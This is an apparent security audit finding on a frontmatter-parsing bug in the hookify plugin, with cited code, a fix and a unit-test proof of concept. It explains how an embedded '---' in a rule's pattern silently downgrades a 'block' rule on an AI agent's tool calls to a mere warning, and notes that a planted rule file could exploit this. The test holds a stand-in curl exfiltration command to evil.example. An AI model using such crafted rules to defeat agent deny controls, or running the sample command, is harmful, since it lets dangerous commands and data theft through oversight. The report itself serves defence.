### Title
Naive `---` substring split in `extract_frontmatter` lets an embedded delimiter in a field value silently downgrade a `block` rule to `warn` - (File: `plugins/hookify/core/config_loader.py`)

### Summary
`extract_frontmatter` locates the frontmatter boundary with `content.split('---', 2)`, a raw substring search that has no awareness of YAML quoting or line context. If any frontmatter field value (e.g. `pattern`) contains the literal substring `---`, that occurrence is treated as the closing delimiter, truncating the real frontmatter block and pushing subsequent lines - including `action: block` - into the parsed "message" body instead of the frontmatter dict. Since `Rule.from_dict` defaults missing `action` to `"warn"`, a rule file that visually reads as `action: block` is silently enforced as a warning (or, in more extreme truncations, dropped entirely as an invalid rule with no frontmatter).

### Finding Description
`extract_frontmatter` in `plugins/hookify/core/config_loader.py:87-103` does:
```python
parts = content.split('---', 2)
frontmatter_text = parts[1]
message = parts[2].strip()
``` [1](#0-0) 
This split operates over the entire raw file text and matches any occurrence of the three-character substring `---`, not just a standalone delimiter line. Any frontmatter value containing `---` (e.g. a `pattern` regex meant to match commands with triple dashes, such as `curl -X POST --- http://evil` or `docker run --rm -it ---dangerous`) is indistinguishable from the intended closing `---` marker. When such a value appears in a field declared before `action:` in the file, the split terminates the frontmatter block early, and everything after that embedded `---` — including the real `action: block` line and the intended closing marker — is shifted into `message = parts[2]`.

Downstream, `Rule.from_dict` computes `action=frontmatter.get('action', 'warn')` at [2](#0-1) , so a missing `action` key (because it was swallowed into the message body) silently defaults to `"warn"`. In `rule_engine.py`, `RuleEngine.evaluate_rules` only routes rules with `rule.action == 'block'` into `blocking_rules`; everything else becomes a non-blocking `warning_rules` entry that merely emits a `systemMessage` and allows the operation to proceed [3](#0-2) . For `PreToolUse` events (Bash/Edit/Write/MultiEdit), a `block` classification is what produces `"permissionDecision": "deny"`; a downgraded `warn` classification instead only surfaces a message while still allowing the tool call, and `pretooluse.py` executes this evaluation on every Bash/Edit/Write/MultiEdit call [4](#0-3) .

No existing check catches this: there is no YAML-spec-compliant parser (PyYAML is not used), no validation that the frontmatter dict contains all expected keys, no line-anchored delimiter matching (`^---$`), and parse/read exceptions in `load_rule_file` are swallowed with only a stderr warning rather than surfaced as a hard failure [5](#0-4) .

### Impact Explanation
This breaks the invariant that a guardrail rule's `action: block` (visible in the file) reliably blocks the matching dangerous tool call. If a hookify rule file intended to hard-block a dangerous Bash command, Edit, or Write ends up with its `action` field accidentally shifted into the message body (due to an unrelated `---` substring in a `pattern`/regex value), the rule silently becomes a non-blocking warning, and the underlying dangerous command/file operation is permitted to execute. In the extreme case where the truncation empties the entire frontmatter dict, `load_rule_file` treats the file as having no frontmatter and drops the rule from enforcement altogether, per the `if not frontmatter:` branch at [6](#0-5) . This matches "Unauthorized local command execution that bypasses Claude Code approval or deny controls" because the deny path in `pretooluse.py`/`rule_engine.py` never triggers for the intended block condition.

### Likelihood Explanation
The bug is purely a parser defect, not requiring any tool bypass or privilege escalation. It is triggered whenever a hookify rule author writes a regex/pattern field that legitimately contains a `---` substring (a very plausible real-world occurrence for shell/command patterns, e.g. matching `--force`, YAML-like separators, `git diff` markers, or triple-dash CLI flags), or when a malicious actor with any ability to influence repository `.claude/hookify.*.local.md` content (e.g. via a PR to a shared repo, or a supply-chain-planted rules file that a victim clones and trusts) intentionally crafts such a pattern to make a rule appear as `action: block` while it silently parses as `warn`/ignored. Because `load_rule_file` swallows the resulting parse anomalies without raising, the mismatch between the visible file and the enforced `Rule` object is not surfaced to the user, making the downgrade both reproducible and stealthy.

### Recommendation
Replace the naive substring split with a strict, line-anchored frontmatter parser: match `^---\s*$` at the start of the content and use `re.split` (or manual line scanning) on lines that are exactly `---` (ignoring leading/trailing whitespace), rather than searching for the raw substring anywhere in the text. Additionally, use a real YAML parser (`yaml.safe_load`) for the frontmatter block instead of the hand-rolled line parser, and add a post-parse validation step in `load_rule_file` that rejects/loudly errors on rules where required keys (`name`, `action`) are absent or where the frontmatter dict is empty, rather than silently defaulting `action` to `"warn"`.

### Proof of Concept
Unit test to add to `plugins/hookify/core/config_loader.py` test suite (or a new `test_config_loader.py`):
```python
from hookify.core.config_loader import extract_frontmatter, Rule

def test_embedded_delimiter_downgrades_block_rule():
    content = '''---
name: block-curl-exfil
enabled: true
event: bash
pattern: "curl -X POST --- http://evil.example/exfil"
action: block
---
This command must be blocked.
'''
    frontmatter, message = extract_frontmatter(content)
    rule = Rule.from_dict(frontmatter, message)

    # Expected (secure) behavior: action should be "block" as written in the file.
    # Actual behavior: 'action' key is swallowed into the message body because
    # the embedded '---' inside the pattern value is treated as the closing
    # delimiter, so frontmatter.get('action', 'warn') defaults to 'warn'.
    assert rule.action == 'block', (
        f"Rule visibly declares action: block but parsed as '{rule.action}' "
        f"due to malformed delimiter handling in extract_frontmatter"
    )
```
Expected result on the current implementation: the assertion fails with `rule.action == 'warn'`, confirming that `RuleEngine.evaluate_rules` would classify this rule into `warning_rules` instead of `blocking_rules`, allowing the dangerous `Bash` command to execute (with only a warning message) instead of being denied via `"permissionDecision": "deny"`.

### Citations

**File:** plugins/hookify/core/config_loader.py (L75-84)
```python
        return cls(
            name=frontmatter.get('name', 'unnamed'),
            enabled=frontmatter.get('enabled', True),
            event=frontmatter.get('event', 'all'),
            pattern=simple_pattern,
            conditions=conditions,
            action=frontmatter.get('action', 'warn'),
            tool_matcher=frontmatter.get('tool_matcher'),
            message=message.strip()
        )
```

**File:** plugins/hookify/core/config_loader.py (L97-103)
```python
    # Split on --- markers
    parts = content.split('---', 2)
    if len(parts) < 3:
        return {}, content

    frontmatter_text = parts[1]
    message = parts[2].strip()
```

**File:** plugins/hookify/core/config_loader.py (L244-274)
```python
def load_rule_file(file_path: str) -> Optional[Rule]:
    """Load a single rule file.

    Returns:
        Rule object or None if file is invalid.
    """
    try:
        with open(file_path, 'r') as f:
            content = f.read()

        frontmatter, message = extract_frontmatter(content)

        if not frontmatter:
            print(f"Warning: {file_path} missing YAML frontmatter (must start with ---)", file=sys.stderr)
            return None

        rule = Rule.from_dict(frontmatter, message)
        return rule

    except (IOError, OSError, PermissionError) as e:
        print(f"Error: Cannot read {file_path}: {e}", file=sys.stderr)
        return None
    except (ValueError, KeyError, AttributeError, TypeError) as e:
        print(f"Error: Malformed rule file {file_path}: {e}", file=sys.stderr)
        return None
    except UnicodeDecodeError as e:
        print(f"Error: Invalid encoding in {file_path}: {e}", file=sys.stderr)
        return None
    except Exception as e:
        print(f"Error: Unexpected error parsing {file_path} ({type(e).__name__}): {e}", file=sys.stderr)
        return None
```

**File:** plugins/hookify/core/rule_engine.py (L53-94)
```python
        for rule in rules:
            if self._rule_matches(rule, input_data):
                if rule.action == 'block':
                    blocking_rules.append(rule)
                else:
                    warning_rules.append(rule)

        # If any blocking rules matched, block the operation
        if blocking_rules:
            messages = [f"**[{r.name}]**\n{r.message}" for r in blocking_rules]
            combined_message = "\n\n".join(messages)

            # Use appropriate blocking format based on event type
            if hook_event == 'Stop':
                return {
                    "decision": "block",
                    "reason": combined_message,
                    "systemMessage": combined_message
                }
            elif hook_event in ['PreToolUse', 'PostToolUse']:
                return {
                    "hookSpecificOutput": {
                        "hookEventName": hook_event,
                        "permissionDecision": "deny"
                    },
                    "systemMessage": combined_message
                }
            else:
                # For other events, just show message
                return {
                    "systemMessage": combined_message
                }

        # If only warnings, show them but allow operation
        if warning_rules:
            messages = [f"**[{r.name}]**\n{r.message}" for r in warning_rules]
            return {
                "systemMessage": "\n\n".join(messages)
            }

        # No matches - allow operation
        return {}
```

**File:** plugins/hookify/hooks/pretooluse.py (L41-59)
```python
        # Determine event type for filtering
        # For PreToolUse, we use tool_name to determine "bash" vs "file" event
        tool_name = input_data.get('tool_name', '')

        event = None
        if tool_name == 'Bash':
            event = 'bash'
        elif tool_name in ['Edit', 'Write', 'MultiEdit']:
            event = 'file'

        # Load rules
        rules = load_rules(event=event)

        # Evaluate rules
        engine = RuleEngine()
        result = engine.evaluate_rules(rules, input_data)

        # Always output JSON (even if empty)
        print(json.dumps(result), file=sys.stdout)
```
